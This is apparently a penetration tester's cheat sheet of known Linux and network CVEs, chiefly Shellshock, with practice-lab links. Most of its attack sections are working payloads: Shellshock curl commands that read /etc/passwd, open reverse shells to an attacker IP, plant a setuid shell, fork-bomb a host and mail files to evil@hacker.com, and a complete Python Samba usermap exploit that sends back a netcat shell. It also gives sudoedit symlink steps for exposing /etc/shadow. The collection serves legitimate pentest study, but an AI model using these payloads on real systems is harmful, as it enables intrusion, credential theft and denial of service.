# Collections

- <https://github.com/lucyoa/kernel-exploits>

# Exploits

## CVE-2014-6271 - Shellshock

- `Bash 4.3` and earlier
- Execute commands from `environment variables` unintentionally.
- Caused by Bash processing trailing strings after function definitions in the values of environment variables.
- Exploitable when attacker has control of environment variables.

```
GET http://shellshock.testsparker.com/cgi-bin/netsparker.cgi HTTP/1.1
User-Agent: Netsparker
Host: shellshock.testsparker.com
Referer: () { :;}; echo "NS:" $(</etc/passwd)
```

### Test if Vulnerable

```
env x='() { :;}; echo OOPS' bash -c :
env x='() { :;}; echo vulnerable' bash -c "echo not-vulnerable"
```

### Explanation

- To run a command in a new shell

  ```
  bash -c ls
  ```

- New shell inherits environment

- If new shell finds what seems to be a function in an environment variable:

  - New shell executes the function to get the actual value
  - When function is executed, evaluation didn't stop when the end of the function definition is reached.

Hence, when new shell sees `() { :;};`, bash will start executing the function and proceed to also execute the `echo`.

### Samples

Passwd

```
curl -A '() { :;}; echo "Content-Type: text/plain"; echo; /bin/cat /etc/passwd' http://192.168.1.14/cgi-bin/status
```

```
curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" \
http://192.168.1.14/cgi-bin/status
```

Directory Listing

```
curl -A '() { :;}; echo "Content-Type: text/plain"; echo; /bin/ls /' http://192.168.1.14/cgi-bin/status
```

Reverse shell

```
curl -A '() { :; }; /bin/bash -c "/usr/bin/nc -lvvp 2345 -e /bin/bash"' http://192.168.1.14/cgi-bin/status
```

``` `
curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.14.203/1234 0>&1' http://10.10.10.56/cgi-bin/user.sh
```

Setuid shell

```
() { :; }; cp /bin/bash /tmp/bash && chmod 4755 /tmp/bash
```

Fork Bomb

```
() { :; }; :(){ :|: & };:
```

Ping Bot

```
() { :; }; ping -s 1000000 <victim IP>
```

Data Theft

```
() { :; }; find ~ -print | mail -s "Your files" evil@hacker.com
() { :; }; cat ~/.secret/passwd | mail -s "This password file" evil@hacker.com
```

### Exploitation Vectors

> - Ref: <https://github.com/opsxcq/exploit-CVE-2014-6271>

#### CGI

- Bash will receive the environment variables passed by the server
- Server passes various details of the request to a handler program in the environment variable list. For example, `HTTP_USER_AGENT`.
- `exploit/multi/http/apache_mod_cgi_bash_env_exec`
- [Apache mod_cgi - 'Shellshock' Remote Command Injection](https://www.exploit-db.com/exploits/34900)

#### OpenSSH

- ForceCommand will execute a fixed command on login
- If user specify a command to run, user specific command is put into environment (`SSH_ORIGINAL_COMMAND`)
- Bash will parse `SSH_ORIGINAL_COMMAND` on start-up, and run the commands

#### DHCP clients

- Some DHCP clients can also pass commands to Bash
- Malicious DHCP server provide, a string crafted to execute code (in an addition option)

#### Qmail server

- Qmail mail server passes external input through in a way that can exploit a vulnerable version of Bash.

#### IBM HMC restricted shell

### References

- [Shellshock: How does it actually work?](https://fedoramagazine.org/shellshock-how-does-it-actually-work/)
- [[Related Issues+] ShellShock: All you need to know about the Bash Bug vulnerability](https://www.symantec.com/connect/blogs/shellshock-all-you-need-know-about-bash-bug-vulnerability)

### Practice

- <https://pentesterlab.com/exercises/cve-2014-6271>
- [[Docker] Shellshock exploit + vulnerable environment](https://github.com/opsxcq/exploit-CVE-2014-6271)
- HTB - Shocker

## CVE-2014-7169

## CVE-2014-0160 - Heartbleed

Exploits:

- <https://github.com/sensepost/heartbleed-poc>
- <https://gist.github.com/eelsivart/10174134>

### References

- <https://fedoramagazine.org/update-on-cve-2014-0160-aka-heartbleed/>

## CVE-2016-4971 - GNU Wget < 1.18 - Arbitrary File Upload / Remote Code Execution

- issuing a crafted HTTP 30X Redirect containing FTP server reference in response
- `wget` will automatically follow the redirect
- `wget` will download a malicious file from the FTP server (to current dir)
- `wget` will fail to rename the file to the originally requested filename
- will not work with `-O`
- However, By saving `.wgetrc` in `/home/victim/.wgetrc` could set arbitrary wget settings such as destination directory

Exploits:

- <https://www.exploit-db.com/exploits/40064>

## OpenSSH <=6.6 SFTP misconfiguration

Exploit:

- <https://github.com/SECFORCE/sftp-exploit>

References:

- <https://www.secforce.com/blog/2018/03/openssh_exploit_32_and_64_bit/>

Practice:

- HTB - Nightmare

## CVE-2007-2447 - (SMB) Samba 3.0.20 < 3.0.25rc3

- Exploitable when using the non-default "username map script" configuration option.
- By specifying a username containing shell meta characters, attackers can execute arbitrary commands.
- Case study: <https://amriunix.com/post/cve-2007-2447-samba-usermap-script/>
- `exploit/multi/samba/usermap_script`

Exploits:

- <https://github.com/amriunix/cve-2007-2447>

```python
#!/usr/bin/python
# -*- coding: utf-8 -*-

# From : https://github.com/amriunix/cve-2007-2447
# case study : https://amriunix.com/post/cve-2007-2447-samba-usermap-script/

import sys
from smb.SMBConnection import SMBConnection

def exploit(rhost, rport, lhost, lport):
        payload = 'mkfifo /tmp/hago; nc ' + lhost + ' ' + lport + ' 0</tmp/hago | /bin/sh >/tmp/hago 2>&1; rm /tmp/hago'
        username = "/=`nohup " + payload + "`"
        conn = SMBConnection(username, "", "", "")
        try:
            conn.connect(rhost, int(rport), timeout=1)
        except:
            print '[+] Payload was sent - check netcat !'

if __name__ == '__main__':
    print('[*] CVE-2007-2447 - Samba usermap script')
    if len(sys.argv) != 5:
        print("[-] usage: python " + sys.argv[0] + " <RHOST> <RPORT> <LHOST> <LPORT>")
    else:
        print("[+] Connecting !")
        rhost = sys.argv[1]
        rport = sys.argv[2]
        lhost = sys.argv[3]
        lport = sys.argv[4]
        exploit(rhost, rport, lhost, lport)
```

# Privilege Escalation

## CVE-2010-0832 - Linux PAM 1.1.X MOTD File Tampering

- pam_motd (aka the MOTD module) in libpam-modules
- Before 1.1.0-2ubuntu1.1 in PAM on Ubuntu 9.10
- Before 1.1.1-2ubuntu5 in PAM on Ubuntu 10.04 LTS
- Change the ownership of arbitrary files via a symlink attack on .cache in a user's home directory.
- "user file stamps" and the `motd.legal-notice` file.

Exploits:

- <https://www.exploit-db.com/exploits/14339>
- <https://www.exploit-db.com/exploits/14273>
- <https://twitter.com/jonoberheide/status/18009527979>

Practice:

- HTB - Popcorn

## CVE-2015-5602 - 'Sudoedit' Unauthorized Privilege Escalation

- RHEL 5/6/7 / Ubuntu
- Sudo <= 1.8.14
- When /etc/sudoers reads:

  ```
  <user_to_grant_priv> ALL=(root) NOPASSWD: sudoedit /home/*/*/test.txt
  ```

- Sudoedit does not check the full path if a wildcard is used **twice** (e.g. /home/_/_/file.txt),

- Allowing a malicious user to replace the file.txt real file with a symbolic link to a different location (e.g. /etc/shadow).

Example:

- `/home/<user_to_grant_priv>/newdir`, `test.txt` pointing to `/etc/shadow`
- `ln -sf /etc/shadow /home/<user_to_grant_priv>/newdir/test.txt`
- Then do `sudoedit /home/<user_to_grant_priv>/newdir/test.txt`
- OR `sudoedit -u <user_to_grant_priv> /home/<user_to_grant_priv>/newdir/test.txt`
- <https://github.com/t0kx/privesc-CVE-2015-5602/blob/master/exploit.sh>

Usages:

- Expose /etc/shadow
- Expose ​authorized_keys over HTTP

  ```
  cd /var/www/testing/writeup
  ln -s /home/alekos/.ssh/authorized_keys layout.html
  ```

References:

- <https://www.exploit-db.com/exploits/37710>

Practice:

- <https://github.com/t0kx/privesc-CVE-2015-5602>
- HTB - Jocker

## CVE-2016-7545 - SELinux sandbox escape

- When executing a program via the SELinux sandbox
- The nonpriv session can escape to the parent session
- By using the TIOCSTI ioctl to push characters into the terminal's input buffer

```
#include <unistd.h>
#include <sys/ioctl.h>

int main()
{
    char *cmd = "id\n";
    while(*cmd)
     ioctl(0, TIOCSTI, cmd++);
    execlp("/bin/id", "id", NULL);
}

$ gcc test.c -o test
$ /bin/sandbox ./test
id
```

References

- <https://seclists.org/oss-sec/2016/q3/606>

## CVE-2017-1000112 - UFO Linux kernel

- Ubuntu Trusty 4.4.0-*
- Ubuntu Xenial 4-8-0-*
- Ubuntu Xenial (16.04) 4.4.0-81

References:

- <https://www.openwall.com/lists/oss-security/2017/08/13/1>
- <https://ricklarabee.blogspot.com/2017/12/adapting-poc-for-cve-2017-1000112-to.html>

Exploit:

- <https://github.com/xairy/kernel-exploits/tree/master/CVE-2017-1000112>

Practice:

- HTB - Nightmare

## CVE-2019-13272 - Linux kernel 5.1.17 - Unauthorized Access

- <https://0day.life/exploit/0day-636.html?fbclid=IwAR3ZMXDf8TXs7Q_k5rgL8je4BKPPEgUb106uZEMGoxNgCs08y60KXstqOsY>
- ptrace_link in kernel/ptrace.c mishandles the recording of the credentials of a process that wants to create a ptrace relationship
- allows local users to obtain root access
- SELinux deny_ptrace might be a usable workaround

## CVE-2017-6074 - Linux Kernel DCCP double free

- Double-free vulnerability in the Datagram Congestion Control Protocol (DCCP)
- Allows an unprivileged user to alter kernel memory from an unprivileged process or cause a denial of service.
- Applies to all Linux kernels since 2.6.18 (September 2006) - may have been first introduced as early as October 2005
- The Datagram Congestion Control Protocol (DCCP) is designed to support streaming media and telephony.
- There is a weakness in the way that it freed SKB (socket buffer) resources if the IPV6_RECVPKTINFO option is enabled on the socket.
- The kernel believed that the memory was still in use by the SKB, allowing an unprivileged local user to write to the kernel's memory space, and then to have any code that was written executed within the kernel.

References:

- <https://blog.cloudpassage.com/2017/02/23/vulnerability-linux-kernel-dccp/>

POC:

- <https://github.com/xairy/kernel-exploits/tree/master/CVE-2017-6074>

Practice:

- HTB - Blocky

## DirtyCow - CVE-2016-5195

- A race condition was found in the way the Linux kernel's memory subsystem handled the copy-on-write (COW)
- breakage of private read-only memory mappings.
- Gain write access to otherwise read-only memory mappings.

POC:

- <https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs>
- <https://github.com/FireFart/dirtycow/blob/master/dirty.c>
